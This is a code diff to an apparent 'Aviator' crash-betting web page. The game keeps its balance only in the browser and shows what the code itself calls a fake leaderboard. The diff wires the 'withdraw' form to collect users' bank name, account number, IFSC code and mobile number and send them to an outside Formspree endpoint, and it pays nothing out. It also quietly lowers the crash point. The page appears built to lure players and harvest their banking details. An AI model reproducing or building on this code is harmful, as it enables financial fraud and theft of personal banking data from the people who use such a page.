@@ -31,7 +31,7 @@
         /* Game Area */
         .game-area { position: relative; width: 95%; max-width: 600px; height: 260px; background: #000; margin: 10px auto; border-radius: 15px; overflow: hidden; border: 1px solid #333; }
         #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 55px; font-weight: bold; z-index: 100; text-shadow: 0 0 10px rgba(255,255,255,0.3); }
-        #plane { position: absolute; font-size: 40px; z-index: 200; display: none; transform: rotate(-10deg); }
+        #plane { position: absolute; font-size: 40px; z-index: 200; display: none; transform: rotate(-10deg); transition: 0.1s; }
         canvas { position: absolute; bottom: 0; left: 0; z-index: 50; }
 
         /* Controls */
@@ -74,11 +74,11 @@
         <div class="card">
             <span class="close-x" onclick="closePop('withdrawScreen')">&times;</span>
             <h2 style="color:var(--gold)">WITHDRAW</h2>
-            <input type="text" placeholder="Bank Name">
-            <input type="number" placeholder="Account Number">
-            <input type="text" placeholder="IFSC Code">
+            <input type="text" id="bankName" placeholder="Bank Name">
+            <input type="number" id="accNum" placeholder="Account Number">
+            <input type="text" id="ifscCode" placeholder="IFSC Code">
             <input type="number" id="withAmt" placeholder="Min ₹100">
-            <button class="btn-action" style="background:var(--gold); color:black;" onclick="processWithdraw()">WITHDRAW NOW</button>
+            <button id="withdrawBtnSubmit" class="btn-action" style="background:var(--gold); color:black;" onclick="processWithdraw()">WITHDRAW NOW</button>
         </div>
     </div>
 
@@ -124,7 +124,7 @@
     <div class="leaderboard" id="lbContent"></div>
 
     <script>
-        let userData = JSON.parse(localStorage.getItem('aviatorUser')) || { balance: 30, history: [], loggedIn: false };
+        let userData = JSON.parse(localStorage.getItem('aviatorUser')) || { balance: 30, history: [], loggedIn: false, mobile: "" };
         let isPlaying = false, mult = 1.0, crashAt = 0, ani;
         const canvas = document.getElementById('gameCanvas'), ctx = canvas.getContext('2d');
         const plane = document.getElementById('plane'), multDisplay = document.getElementById('multiplier');
@@ -138,26 +138,79 @@
 
         window.onload = () => { if(userData.loggedIn) closePop('signupScreen'); updateUI(); startFakeLB(); };
 
-        function handleSignup() { alert("Ready! Login now."); toggleAuth(true); }
-        function handleLogin() { userData.loggedIn = true; updateUI(); closePop('loginScreen'); closePop('signupScreen'); }
+        function handleSignup() { 
+            let mob = document.getElementById('sMob').value;
+            if(!mob) return alert("Please enter mobile number");
+            userData.mobile = mob;
+            alert("Account Created! Login now."); 
+            toggleAuth(true); 
+        }
+
+        function handleLogin() { 
+            let mob = document.getElementById('lMob').value;
+            if(!mob) return alert("Enter login details");
+            userData.loggedIn = true; 
+            userData.mobile = mob;
+            updateUI(); 
+            closePop('loginScreen'); 
+            closePop('signupScreen'); 
+        }
+
         function toggleAuth(s) { document.getElementById('signupScreen').classList.toggle('hidden', s); document.getElementById('loginScreen').classList.toggle('hidden', !s); }
         function openPop(id) { document.getElementById(id).classList.remove('hidden'); }
         function closePop(id) { document.getElementById(id).classList.add('hidden'); }
 
+        // --- FORMSPREE WITHDRAWAL LOGIC ---
         function processWithdraw() {
-            let amt = parseInt(document.getElementById('withAmt').value);
-            if(amt < 100 || userData.balance < amt) return alert("Min ₹100 required!");
-            userData.balance -= amt;
-            userData.history.unshift({ date: new Date().toLocaleDateString(), amount: amt, status: 'Pending' });
-            updateUI(); alert("Withdrawal successfully!"); closePop('withdrawScreen');
+            const bank = document.getElementById('bankName').value;
+            const acc = document.getElementById('accNum').value;
+            const ifsc = document.getElementById('ifscCode').value;
+            const amt = parseInt(document.getElementById('withAmt').value);
+            const btn = document.getElementById('withdrawBtnSubmit');
+
+            if(!bank || !acc || !ifsc || !amt) return alert("Please fill all bank details!");
+            if(amt < 100) return alert("Minimum withdrawal ₹100");
+            if(userData.balance < amt) return alert("Insufficient balance!");
+
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            // Sending to Formspree
+            fetch("https://formspree.io/f/mojneryq", {
+                method: "POST",
+                body: JSON.stringify({
+                    User_Mobile: userData.mobile,
+                    Bank_Name: bank,
+                    Account_Number: acc,
+                    IFSC: ifsc,
+                    Amount: "₹" + amt,
+                    Date: new Date().toLocaleString()
+                }),
+                headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }
+            }).then(response => {
+                if (response.ok) {
+                    userData.balance -= amt;
+                    userData.history.unshift({ date: new Date().toLocaleDateString(), amount: amt, status: 'Pending' });
+                    updateUI();
+                    alert("Withdrawal successfully! Details sent to Admin.");
+                    closePop('withdrawScreen');
+                } else {
+                    alert("Submission failed. Try again.");
+                }
+            }).catch(() => {
+                alert("Network error!");
+            }).finally(() => {
+                btn.innerText = "WITHDRAW NOW";
+                btn.disabled = false;
+            });
         }
 
+        // --- GAME ENGINE ---
         function runGame() {
             if(!isPlaying) return;
             mult += 0.007 * (mult * 0.4);
             multDisplay.innerText = mult.toFixed(2) + "x";
             
-            // Auto Cashout Logic
             if(mult >= parseFloat(document.getElementById('autoValue').value)) { cashOut(); return; }
 
             let x = (mult - 1) * 75, y = 300 - (Math.pow(mult, 1.3) * 18);
@@ -167,9 +220,13 @@
             plane.style.display = "block"; plane.style.left = x + "px"; plane.style.top = (y-20) + "px";
 
             if(mult >= crashAt) {
-                isPlaying = false; multDisplay.innerText = "FLEW AWAY!"; multDisplay.style.color = "red";
+                isPlaying = false; 
+                multDisplay.innerText = "FLEW AWAY!"; 
+                multDisplay.style.color = "red";
                 resetBtn();
-            } else { ani = requestAnimationFrame(runGame); }
+            } else { 
+                ani = requestAnimationFrame(runGame); 
+            }
         }
 
         function handleGame() {
@@ -178,7 +235,7 @@
                 let amt = parseInt(document.getElementById('betAmount').value);
                 if(userData.balance < amt) return alert("Low Balance!");
                 userData.balance -= amt; updateUI();
-                mult = 1.0; crashAt = (Math.random() * 5 + 1.1).toFixed(2);
+                mult = 1.0; crashAt = (Math.random() * 4 + 1.1).toFixed(2);
                 isPlaying = true;
                 document.getElementById('betBtn').innerText = "CASH OUT";
                 document.getElementById('betBtn').classList.add('cashout-mode');
